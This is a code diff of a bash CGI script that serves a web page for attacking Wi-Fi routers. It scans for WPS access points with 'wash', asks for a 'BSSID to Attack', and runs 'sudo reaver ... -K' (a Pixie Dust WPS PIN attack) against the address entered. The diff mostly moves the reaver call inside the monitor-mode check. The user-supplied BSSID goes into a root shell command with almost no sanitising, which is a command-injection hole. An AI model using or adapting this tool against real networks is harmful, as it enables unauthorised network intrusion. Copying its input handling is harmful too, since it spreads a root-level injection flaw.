@@ -12,10 +12,9 @@ echo '<body>'
 
 mon0check=`iwconfig wlan1 | grep Monitor | sed -e "s/Mode:/ /" | awk '{print $1}' | cut -b 5`
 if [ $mon0check -eq 1 ]; then
-echo "<pre> $(sudo timeout 20 wash -i wlan1)"
-
 [
-  echo "<form method=GET action=\"${SCRIPT}\">"\
+echo "<pre> $(sudo timeout 20 wash -i wlan1)"
+ echo "<form method=GET action=\"${SCRIPT}\">"\
        '<table nowrap>'\
           '<tr><td>Enter BSSID to Attack</TD><TD><input type="text" name="BSSID" size=20></td></tr>'\
           '</tr></table>'
@@ -41,11 +40,11 @@ echo "<pre> $(sudo timeout 20 wash -i wlan1)"
      XX=`echo "$QUERY_STRING" | sed -n 's/^.*BSSID=\([^&]*\).*$/\1/p' | sed "s/%20/ /g" | sed "s/%3A/:/g"`
      echo "BSSID: " $XX
   fi
-]
+  echo "<pre> $(sudo reaver -i wlan1 -b $XX -K -v)</pre>"
+  ]
 else
 echo "<script>alert(\"Monitor Mode is not enabled\")</script>"
 fi
-echo "<pre> $(sudo reaver -i wlan1 -b $XX -K -v)</pre>"
 echo '</body>'
 echo '</html>'
 
